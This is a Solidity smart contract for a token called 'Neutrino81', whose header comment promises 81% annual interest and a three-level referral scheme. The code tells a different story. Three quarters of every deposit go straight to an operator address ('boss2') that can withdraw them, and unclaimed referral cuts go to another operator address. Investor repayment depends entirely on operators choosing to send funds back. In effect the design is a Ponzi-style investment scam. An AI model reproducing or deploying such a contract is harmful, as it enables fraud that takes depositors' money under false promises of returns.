/**
 * Source Code first verified at https://etherscan.io on Thursday, March 21, 2019
 (UTC) */

pragma solidity ^0.4.25;

/*
    [Rules]

  [✓]  21% Referral program
            9% => ref link 1 (or Boss1, if none)
            7% => ref link 2 (or Boss1, if none)
            5% => ref link 3 (or Boss1, if none)
        
  [✓]  4% => dividends for NTS81 holders from each deposit

  [✓]  81% annual interest in USDC
            20.25% quarterly payments 
            6.75% monthly payments 
    
  [✓]   Interest periods
            Q1 15-20 April 2019
            Q2 15-20 July 2019
            Q3 15-20 October 2019
            Q4 15-20 January 2020
            Q1 15-20 April 2020
*/


contract Neutrino81 {
    modifier onlyBagholders {
        require(myTokens() > 0);
        _;
    }

    modifier onlyStronghands {
        require(myDividends(true) > 0);
        _;
    }
    
    modifier onlyAdmin {
        require(msg.sender == admin);
        _;
    }
    
    modifier onlyBoss2 {
        require(msg.sender == boss2);
        _;
    }

    string public name = "Neutrino Token Standard 81";
    string public symbol = "NTS81";
    address public admin;
    address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;
    address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;
    uint8 constant public decimals = 18;
    uint8 constant internal welcomeFee_ = 25;
    uint8 constant internal refLevel1_ = 9;
    uint8 constant internal refLevel2_ = 7;
    uint8 constant internal refLevel3_ = 5;
    uint256 constant internal tokenPrice = 0.001 ether;
    
    uint256 constant internal magnitude = 2 ** 64;
    uint256 public stakingRequirement = 0.05 ether;
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) public referralBalance_;
    mapping(address => int256) internal payoutsTo_;
    mapping(address => uint256) public repayBalance_;

    uint256 internal tokenSupply_;
    uint256 internal profitPerShare_;
    
    constructor() public {
        admin = msg.sender;
    }

    function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {
        return purchaseTokens(msg.value, _ref1, _ref2, _ref3);
    }

    function() payable public {
        purchaseTokens(msg.value, 0x0, 0x0, 0x0);
    }

    function reinvest() onlyStronghands public {
        uint256 _dividends = myDividends(false);
        address _customerAddress = msg.sender;
        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
        _dividends += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress] = 0;
        uint256 _tokens = purchaseTokens(_dividends, 0x0, 0x0, 0x0);
        emit onReinvestment(_customerAddress, _dividends, _tokens);
    }

    function exit() public {
        address _customerAddress = msg.sender;
        uint256 _tokens = tokenBalanceLedger_[_customerAddress];
        if (_tokens > 0) getRepay();
        withdraw();
    }

    function withdraw() onlyStronghands public {
        address _customerAddress = msg.sender;
        uint256 _dividends = myDividends(false);
        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);
        _dividends += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress] = 0;
        _customerAddress.transfer(_dividends);
        emit onWithdraw(_customerAddress, _dividends, now);
    }
    
    function getRepay() public {
        address _customerAddress = msg.sender;
        uint256 balance = repayBalance_[_customerAddress];
        require(balance > 0);
        repayBalance_[_customerAddress] = 0;
        
        _customerAddress.transfer(balance);
        emit onGotRepay(_customerAddress, balance, now);
    }

    function myTokens() public view returns (uint256) {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }

    function myDividends(bool _includeReferralBonus) public view returns (uint256) {
        address _customerAddress = msg.sender;
        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
    }

    function balanceOf(address _customerAddress) public view returns (uint256) {
        return tokenBalanceLedger_[_customerAddress];
    }

    function dividendsOf(address _customerAddress) public view returns (uint256) {
        return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
    }

    function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {
        address _customerAddress = msg.sender;
        
        uint256[4] memory uIntValues = [
            _incomingEthereum * welcomeFee_ / 100,
            0,
            0,
            0
        ];
        
        uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;
        uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;
        uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;
        
        uint256 _dividends = uIntValues[0] - uIntValues[1] - uIntValues[2] - uIntValues[3];
        uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];
        
        uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);
        uint256 _fee = _dividends * magnitude;

        require(_amountOfTokens > 0);

        if (
            _ref1 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement
        ) {
            referralBalance_[_ref1] += uIntValues[1];
        } else {
            referralBalance_[boss1] += uIntValues[1];
            _ref1 = 0x0000000000000000000000000000000000000000;
        }
        
        if (
            _ref2 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement
        ) {
            referralBalance_[_ref2] += uIntValues[2];
        } else {
            referralBalance_[boss1] += uIntValues[2];
            _ref2 = 0x0000000000000000000000000000000000000000;
        }
        
        if (
            _ref3 != 0x0000000000000000000000000000000000000000 &&
            tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement
        ) {
            referralBalance_[_ref3] += uIntValues[3];
        } else {
            referralBalance_[boss1] += uIntValues[3];
            _ref3 = 0x0000000000000000000000000000000000000000;
        }

        referralBalance_[boss2] += _taxedEthereum;

        if (tokenSupply_ > 0) {
            tokenSupply_ += _amountOfTokens;
            profitPerShare_ += (_dividends * magnitude / tokenSupply_);
            _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_)));
        } else {
            tokenSupply_ = _amountOfTokens;
        }

        tokenBalanceLedger_[_customerAddress] += _amountOfTokens;
        int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee);
        payoutsTo_[_customerAddress] += _updatedPayouts;
        
        emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, now, tokenPrice);

        return _amountOfTokens;
    }

    function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {
        uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;

        return _tokensReceived;
    }

    function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {
        uint256 _etherReceived = _tokens / tokenPrice * 1e18;

        return _etherReceived;
    }
    
    function fund() public payable {
        uint256 perShare = msg.value * magnitude / tokenSupply_;
        profitPerShare_ += perShare;
        emit OnFunded(msg.sender, msg.value, perShare, now);
    }
    
    /* Admin methods */
    function passRepay(address customerAddress) public payable onlyBoss2 {
        uint256 value = msg.value;
        require(value > 0);
        
        repayBalance_[customerAddress] += value;
        emit OnRepayPassed(customerAddress, value, now);
    }

    function passInterest(address customerAddress, uint256 usdRate, uint256 rate) public payable {
     
        require(msg.sender == admin || msg.sender == boss1 || msg.sender == boss2);
        require(msg.value > 0);

        referralBalance_[customerAddress] += msg.value;

        emit OnInterestPassed(customerAddress, msg.value, usdRate, rate, now);
    }
    
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        address ref1,
        address ref2,
        address ref3,
        uint timestamp,
        uint256 price
    );

    event onReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted
    );

    event onWithdraw(
        address indexed customerAddress,
        uint256 value,
        uint256 timestamp
    );
    
    event onGotRepay(
        address indexed customerAddress,
        uint256 value,
        uint256 timestamp
    );
    
    event OnFunded(
        address indexed source,
        uint256 value,
        uint256 perShare,
        uint256 timestamp
    );
    
    event OnRepayPassed(
        address indexed customerAddress,
        uint256 value,
        uint256 timestamp
    );

    event OnInterestPassed(
        address indexed customerAddress,
        uint256 value,
        uint256 usdRate,
        uint256 rate,
        uint256 timestamp
    );
}